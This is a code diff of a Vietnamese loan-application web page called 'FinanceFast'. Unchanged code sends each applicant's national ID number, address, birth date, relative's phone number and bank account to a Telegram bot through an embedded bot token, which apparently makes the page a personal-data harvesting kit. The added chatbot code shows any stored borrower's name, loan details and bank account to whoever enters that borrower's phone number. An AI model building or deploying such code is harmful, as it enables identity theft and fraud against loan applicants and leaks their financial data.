@@ -45,7 +45,6 @@
             </div>
             
             <div class="flex items-center space-x-2">
-                <!-- NÚT ĐẠI DIỆN TÀI KHOẢN TRÊN HEADER (BẤM VÀO SẼ CHUYỂN QUA TAB CÁ NHÂN) -->
                 <button id="userAccountBtn" onclick="handleHeaderAccountClick()" class="text-xs md:text-sm font-extrabold text-slate-900 bg-amber-400 hover:bg-amber-500 px-4 py-2.5 rounded-xl shadow-sm transition">Đăng Nhập</button>
             </div>
         </div>
@@ -173,7 +172,6 @@
                     </div>
                 </div>
 
-                <!-- CÁC TIỆN ÍCH TÀI KHOẢN -->
                 <div class="space-y-2 text-xs">
                     <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 flex justify-between items-center font-bold text-slate-700">
                         <span>🛡️ Trung tâm bảo mật & Mật khẩu</span>
@@ -606,6 +604,7 @@
             if(e.key === 'Enter') sendChatMessage();
         }
 
+        // --- BOT CHECK SĐT KHÁCH CHUẨN XÁC, GỬI HD VAY VÀ HỎI THÊM ---
         async function sendChatMessage() {
             const input = document.getElementById('chatInput');
             const text = input.value.trim();
@@ -618,7 +617,7 @@
                 const found = allLoans.find(l => l.user === text || (l.rPhone && l.rPhone.includes(text)));
                 setTimeout(() => {
                     if(found) {
-                        addBotMessage(`Dạ em đã tìm thấy hồ sơ của SĐT ${text}:\n- Khoản vay: ${found.amount} (${found.term})\n- Đóng hàng tháng: ${found.monthlyPayment}\n- Trạng thái: ${found.status}\n\nAnh/chị có cần em hỗ trợ gì thêm về khoản vay không ạ?`, "Bot Trợ Lý");
+                        addBotMessage(`Dạ em đã tra cứu thấy thông tin khoản vay của số ${text}:\n\n📋 **HỢP ĐỒNG VAY TÍN DỤNG**\n- Khách hàng: ${found.name}\n- Số tiền vay: ${found.amount} (${found.term})\n- Đóng hàng tháng: ${found.monthlyPayment}\n- Mục đích vay: ${found.purpose}\n- Trạng thái hồ sơ: ${found.status}\n- Ngân hàng nhận: ${found.bankName} (${found.bankAccount})\n\n👉 Dạ anh/chị có cần em hỗ trợ gì thêm về khoản vay này không ạ?`, "Bot Trợ Lý");
                     } else {
                         addBotMessage(`❌ Số điện thoại ${text} chưa đăng ký hồ sơ hoặc không chính xác. Vui lòng kiểm tra lại số điện thoại hoặc tạo đơn vay mới!`, "Bot Trợ Lý");
                     }
@@ -1095,12 +1094,14 @@
             btn.disabled = true;
             btn.textContent = "Đang gửi hồ sơ về hệ thống...";
 
+            const calculatedMonthlyPayment = document.getElementById('monthlyPayment').textContent;
+
             const newLoan = {
                 user: currentUser,
                 name: formData.name,
                 amount: formData.amount,
                 term: formData.term,
-                monthlyPayment: formData.monthlyPayment,
+                monthlyPayment: calculatedMonthlyPayment,
                 purpose: formData.purpose,
                 company: formData.company,
                 compPhone: formData.compPhone,
@@ -1123,7 +1124,7 @@
             localStorage.setItem('ff_loans', JSON.stringify(allLoans));
 
             try {
-                const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 Mã phiên / SĐT: #${currentUser}\n💰 Số tiền vay: ${formData.amount} (${formData.term})\n💵 Đóng hàng tháng: ${formData.monthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n📅 Ngày đóng lãi: ${formData.payDay}\n\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
+                const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 Mã phiên / SĐT: #${currentUser}\n💰 Số tiền vay: ${formData.amount} (${formData.term})\n💵 Đóng hàng tháng: ${calculatedMonthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n📅 Ngày đóng lãi: ${formData.payDay}\n\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
